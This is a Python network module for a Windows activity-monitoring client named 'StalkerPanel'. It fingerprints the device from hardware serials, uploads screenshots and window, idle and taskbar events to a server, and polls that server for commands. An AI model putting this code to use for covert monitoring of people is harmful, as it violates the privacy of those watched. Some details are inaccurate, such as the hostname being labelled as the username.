#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
api_client.py - 网络通信模块
负责与后端服务器的所有 REST API 通信，包括设备注册、心跳、数据上传、命令轮询等。
"""

import json
import time
import logging
import threading
import queue
import uuid
import hashlib
import platform
import socket
from typing import Optional, Dict, Any, List

import requests
from requests.exceptions import RequestException, Timeout, ConnectionError

logger = logging.getLogger(__name__)


class OfflineQueue:
    """离线队列 - 当服务器不可达时缓存数据，恢复后重发"""

    def __init__(self, max_size: int = 500, persist_path: str = "offline_queue.json"):
        """
        初始化离线队列
        :param max_size: 队列最大容量
        :param persist_path: 持久化文件路径
        """
        self._queue = queue.Queue(maxsize=max_size)
        self._persist_path = persist_path
        self._lock = threading.Lock()
        self._load_from_disk()

    def _load_from_disk(self):
        """从磁盘加载持久化的离线数据"""
        try:
            with open(self._persist_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
                for item in data:
                    try:
                        self._queue.put_nowait(item)
                    except queue.Full:
                        logger.warning("离线队列已满，丢弃旧数据")
                        break
            logger.info(f"从磁盘恢复了 {self._queue.qsize()} 条离线数据")
        except (FileNotFoundError, json.JSONDecodeError, IOError) as e:
            logger.debug(f"无离线数据文件或读取失败: {e}")

    def _save_to_disk(self):
        """将离线数据持久化到磁盘"""
        try:
            with self._lock:
                items = list(self._queue.queue)
            with open(self._persist_path, 'w', encoding='utf-8') as f:
                json.dump(items, f, ensure_ascii=False, indent=2)
        except IOError as e:
            logger.error(f"离线数据持久化失败: {e}")

    def put(self, item: Dict[str, Any]) -> bool:
        """
        添加数据到离线队列
        :param item: 数据项
        :return: 是否添加成功
        """
        try:
            self._queue.put_nowait(item)
            return True
        except queue.Full:
            logger.warning("离线队列已满，丢弃最新数据")
            return False

    def get_all(self) -> List[Dict[str, Any]]:
        """获取所有离线数据并清空队列"""
        items = []
        while not self._queue.empty():
            try:
                items.append(self._queue.get_nowait())
            except queue.Empty:
                break
        if items:
            self._save_to_disk()
        return items

    def size(self) -> int:
        """获取队列大小"""
        return self._queue.qsize()

    def clear(self):
        """清空队列"""
        while not self._queue.empty():
            try:
                self._queue.get_nowait()
            except queue.Empty:
                break
        self._save_to_disk()


class APIClient:
    """API 客户端 - 与后端服务器的通信核心"""

    def __init__(self, server_url: str, device_name: str, config: Dict[str, Any]):
        """
        初始化 API 客户端
        :param server_url: 服务器地址
        :param device_name: 设备名称
        :param config: 配置字典
        """
        self.server_url = server_url.rstrip('/')
        self.device_name = device_name
        self.config = config

        # 设备信息
        self.device_id = self._generate_device_id()
        self.session_id = str(uuid.uuid4())

        # HTTP 会话
        self._session = requests.Session()
        self._session.headers.update({
            'Content-Type': 'application/json',
            'X-Device-ID': self.device_id,
            'X-Session-ID': self.session_id,
            'User-Agent': f'StalkerPanel-Windows/{platform.version()}'
        })

        # 重试配置
        self.max_retries = 3
        self.retry_delay = 5  # 秒
        self.request_timeout = 15  # 秒

        # 离线队列
        self.offline_queue = OfflineQueue()

        # 连接状态
        self._connected = False
        self._connected_lock = threading.Lock()

        # 回调函数
        self._on_disconnect_callbacks = []
        self._on_reconnect_callbacks = []

        logger.info(f"API客户端初始化完成 - 设备ID: {self.device_id}")

    def _generate_device_id(self) -> str:
        """
        生成基于硬件的唯一设备 ID
        使用主板序列号 + 磁盘序列号 + CPU ID 的哈希值
        """
        try:
            import subprocess
            # 获取主板序列号
            result = subprocess.run(
                'wmic baseboard get serialnumber',
                shell=True, capture_output=True, text=True, timeout=10
            )
            board_serial = result.stdout.strip()

            # 获取磁盘序列号
            result = subprocess.run(
                'wmic diskdrive get serialnumber',
                shell=True, capture_output=True, text=True, timeout=10
            )
            disk_serial = result.stdout.strip()

            # 获取计算机名 + 用户名
            hostname = socket.gethostname()
            username = platform.node()

            # 组合生成唯一哈希
            raw = f"{board_serial}|{disk_serial}|{hostname}|{username}"
            return hashlib.sha256(raw.encode('utf-8')).hexdigest()[:32]
        except Exception as e:
            logger.warning(f"硬件ID生成失败，使用随机ID: {e}")
            return hashlib.sha256(str(uuid.uuid4()).encode('utf-8')).hexdigest()[:32]

    @property
    def connected(self) -> bool:
        """获取连接状态"""
        with self._connected_lock:
            return self._connected

    @connected.setter
    def connected(self, value: bool):
        """设置连接状态"""
        old_value = self.connected
        with self._connected_lock:
            self._connected = value

        if old_value and not value:
            # 断开连接
            logger.warning("服务器连接已断开")
            for cb in self._on_disconnect_callbacks:
                try:
                    cb()
                except Exception as e:
                    logger.error(f"断开回调执行失败: {e}")
        elif not old_value and value:
            # 重新连接
            logger.info("服务器连接已恢复")
            for cb in self._on_reconnect_callbacks:
                try:
                    cb()
                except Exception as e:
                    logger.error(f"重连回调执行失败: {e}")

    def on_disconnect(self, callback):
        """注册断开连接回调"""
        self._on_disconnect_callbacks.append(callback)

    def on_reconnect(self, callback):
        """注册重新连接回调"""
        self._on_reconnect_callbacks.append(callback)

    def _request(self, method: str, endpoint: str, data: Optional[Dict] = None,
                 files: Optional[Dict] = None, timeout: Optional[int] = None) -> Optional[Dict]:
        """
        发送 HTTP 请求（带重试逻辑）
        :param method: HTTP 方法 (GET/POST/PUT/DELETE)
        :param endpoint: API 端点
        :param data: 请求体数据
        :param files: 上传文件
        :param timeout: 超时时间
        :return: 响应 JSON 或 None
        """
        url = f"{self.server_url}{endpoint}"
        timeout = timeout or self.request_timeout
        headers = {}

        # 如果有文件上传，不设置 Content-Type（让 requests 自动处理）
        if files:
            headers.pop('Content-Type', None)

        for attempt in range(self.max_retries):
            try:
                if method.upper() == 'GET':
                    resp = self._session.get(url, params=data, timeout=timeout, headers=headers)
                elif method.upper() == 'POST':
                    if files:
                        resp = self._session.post(url, data=data, files=files, timeout=timeout, headers=headers)
                    else:
                        resp = self._session.post(url, json=data, timeout=timeout, headers=headers)
                elif method.upper() == 'PUT':
                    resp = self._session.put(url, json=data, timeout=timeout, headers=headers)
                elif method.upper() == 'DELETE':
                    resp = self._session.delete(url, json=data, timeout=timeout, headers=headers)
                else:
                    logger.error(f"不支持的 HTTP 方法: {method}")
                    return None

                # 检查响应状态
                if resp.status_code == 200 or resp.status_code == 201:
                    self.connected = True
                    try:
                        return resp.json()
                    except (json.JSONDecodeError, ValueError):
                        return {"status": "ok"}
                elif resp.status_code == 429:
                    # 请求过于频繁，等待后重试
                    wait_time = int(resp.headers.get('Retry-After', self.retry_delay * (attempt + 1)))
                    logger.warning(f"请求频率限制，等待 {wait_time} 秒后重试")
                    time.sleep(wait_time)
                    continue
                elif resp.status_code >= 500:
                    # 服务器错误，重试
                    logger.warning(f"服务器错误 {resp.status_code}，第 {attempt + 1} 次重试")
                    time.sleep(self.retry_delay * (attempt + 1))
                    continue
                else:
                    # 客户端错误
                    logger.error(f"请求失败 {resp.status_code}: {resp.text}")
                    try:
                        return resp.json()
                    except (json.JSONDecodeError, ValueError):
                        return {"error": resp.text}

            except (Timeout, ConnectionError) as e:
                logger.warning(f"连接超时或失败 (尝试 {attempt + 1}/{self.max_retries}): {e}")
                self.connected = False
                if attempt < self.max_retries - 1:
                    time.sleep(self.retry_delay * (attempt + 1))
            except RequestException as e:
                logger.error(f"请求异常: {e}")
                self.connected = False
                break

        return None

    def register_device(self) -> bool:
        """
        向服务器注册设备
        :return: 是否注册成功
        """
        device_info = {
            "device_id": self.device_id,
            "device_name": self.device_name,
            "os": f"Windows {platform.version()}",
            "hostname": socket.gethostname(),
            "username": platform.node(),
            "python_version": platform.python_version(),
            "resolution": self._get_screen_resolution(),
            "session_id": self.session_id,
            "client_version": "1.0.0"
        }

        logger.info(f"正在注册设备: {self.device_name} ({self.device_id})")
        result = self._request('POST', '/api/device/register', data=device_info)

        if result and result.get('status') in ('ok', 'success'):
            logger.info("设备注册成功")
            self.connected = True
            return True
        else:
            logger.error(f"设备注册失败: {result}")
            return False

    def _get_screen_resolution(self) -> str:
        """获取屏幕分辨率"""
        try:
            import ctypes
            user32 = ctypes.windll.user32
            width = user32.GetSystemMetrics(0)
            height = user32.GetSystemMetrics(1)
            return f"{width}x{height}"
        except Exception:
            return "unknown"

    def send_heartbeat(self) -> bool:
        """
        发送心跳包
        :return: 是否发送成功
        """
        data = {
            "device_id": self.device_id,
            "timestamp": int(time.time() * 1000),
            "session_id": self.session_id
        }
        result = self._request('POST', '/api/device/heartbeat', data=data)
        return result is not None

    def send_window_event(self, event_data: Dict[str, Any]) -> bool:
        """
        发送窗口切换事件
        :param event_data: 窗口事件数据
        :return: 是否发送成功
        """
        event_data.setdefault("device_id", self.device_id)
        event_data.setdefault("timestamp", int(time.time() * 1000))
        event_data.setdefault("session_id", self.session_id)

        result = self._request('POST', '/api/events/window', data=event_data)
        if result is None:
            # 服务器不可达，存入离线队列
            self.offline_queue.put({
                "type": "window_event",
                "data": event_data,
                "queued_at": int(time.time() * 1000)
            })
            return False
        return True

    def send_screenshot(self, image_base64: str, metadata: Optional[Dict] = None) -> bool:
        """
        上传截图到服务器
        :param image_base64: base64 编码的截图
        :param metadata: 截图元数据
        :return: 是否上传成功
        """
        data = {
            "device_id": self.device_id,
            "image": image_base64,
            "timestamp": int(time.time() * 1000),
            "session_id": self.session_id
        }
        if metadata:
            data.update(metadata)

        result = self._request('POST', '/api/screenshots/upload', data=data,
                               timeout=60)  # 截图上传可能较慢，增加超时
        if result is None:
            logger.warning("截图上传失败（服务器不可达）")
            return False
        return True

    def send_input_idle(self, idle_data: Dict[str, Any]) -> bool:
        """
        发送输入设备空闲状态
        :param idle_data: 空闲数据
        :return: 是否发送成功
        """
        idle_data.setdefault("device_id", self.device_id)
        idle_data.setdefault("timestamp", int(time.time() * 1000))
        idle_data.setdefault("session_id", self.session_id)

        result = self._request('POST', '/api/events/input-idle', data=idle_data)
        if result is None:
            self.offline_queue.put({
                "type": "input_idle",
                "data": idle_data,
                "queued_at": int(time.time() * 1000)
            })
            return False
        return True

    def send_taskbar_state(self, taskbar_data: Dict[str, Any]) -> bool:
        """
        发送任务栏状态
        :param taskbar_data: 任务栏数据
        :return: 是否发送成功
        """
        taskbar_data.setdefault("device_id", self.device_id)
        taskbar_data.setdefault("timestamp", int(time.time() * 1000))
        taskbar_data.setdefault("session_id", self.session_id)

        result = self._request('POST', '/api/events/taskbar', data=taskbar_data)
        return result is not None

    def send_heatmap_data(self, heatmap_data: Dict[str, Any]) -> bool:
        """
        发送窗口切换热力图数据
        :param heatmap_data: 热力图数据
        :return: 是否发送成功
        """
        heatmap_data.setdefault("device_id", self.device_id)
        heatmap_data.setdefault("timestamp", int(time.time() * 1000))
        heatmap_data.setdefault("session_id", self.session_id)

        result = self._request('POST', '/api/events/heatmap', data=heatmap_data)
        return result is not None

    def poll_commands(self) -> Optional[Dict[str, Any]]:
        """
        轮询服务器命令
        :return: 命令数据或 None
        """
        params = {
            "device_id": self.device_id,
            "session_id": self.session_id
        }
        result = self._request('GET', '/api/commands/poll', data=params)
        return result

    def send_meeting_mode_status(self, is_meeting: bool) -> bool:
        """
        发送会议模式状态
        :param is_meeting: 是否在会议中
        :return: 是否发送成功
        """
        data = {
            "device_id": self.device_id,
            "meeting_mode": is_meeting,
            "timestamp": int(time.time() * 1000),
            "session_id": self.session_id
        }
        result = self._request('POST', '/api/events/meeting-mode', data=data)
        return result is not None

    def flush_offline_queue(self) -> int:
        """
        刷新离线队列，重新发送缓存的数据
        :return: 成功发送的数据条数
        """
        items = self.offline_queue.get_all()
        if not items:
            return 0

        success_count = 0
        for item in items:
            item_type = item.get("type")
            item_data = item.get("data", {})

            if item_type == "window_event":
                if self.send_window_event(item_data):
                    success_count += 1
            elif item_type == "input_idle":
                if self.send_input_idle(item_data):
                    success_count += 1
            else:
                logger.warning(f"未知的离线数据类型: {item_type}")
                success_count += 1  # 丢弃未知类型

        logger.info(f"离线队列刷新完成: {success_count}/{len(items)} 条发送成功")
        return success_count

    def update_server_url(self, new_url: str):
        """更新服务器地址"""
        self.server_url = new_url.rstrip('/')
        self._session.headers['User-Agent'] = f'StalkerPanel-Windows/{platform.version()}'
        logger.info(f"服务器地址已更新: {self.server_url}")

    def update_device_name(self, new_name: str):
        """更新设备名称"""
        self.device_name = new_name
        logger.info(f"设备名称已更新: {self.device_name}")
